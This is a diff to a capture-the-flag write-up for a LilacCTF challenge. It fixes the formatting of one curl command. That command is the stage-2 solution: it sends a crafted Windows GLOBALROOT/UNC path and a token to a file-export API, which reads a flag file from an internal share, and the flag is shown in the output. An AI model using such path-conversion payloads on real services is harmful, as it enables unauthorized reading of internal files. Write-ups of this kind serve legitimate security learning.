@@ -42,8 +42,7 @@ Stage2 requires to network access. I thought to use UNC path like `//./UNC/172.2
 
 Finally, my teammate solved stage2.
 ```sh
-$ curl -sG "http://1.95.51.2:8080/api/export/read" --data-urlencode 'path=\\?\GLOBALROOT\??\UNC\172.20.0.10\backup\flag.txt' --data-urlencode 'token=B77ZUznknJJz8a7xV-I9A9NuRbyFPzJV8Gb2g
-YxSZZA'
+$ curl -sG "http://1.95.51.2:8080/api/export/read" --data-urlencode 'path=\\?\GLOBALROOT\??\UNC\172.20.0.10\backup\flag.txt' --data-urlencode 'token=B77ZUznknJJz8a7xV-I9A9NuRbyFPzJV8Gb2gYxSZZA'
 {"content":"LilacCTF{W1n32_t0_NT_P4th_C0nv3rs10n_M4st3r_2026}","size":50,"success":true}
 ```
 `LilacCTF{W1n32_t0_NT_P4th_C0nv3rs10n_M4st3r_2026}`
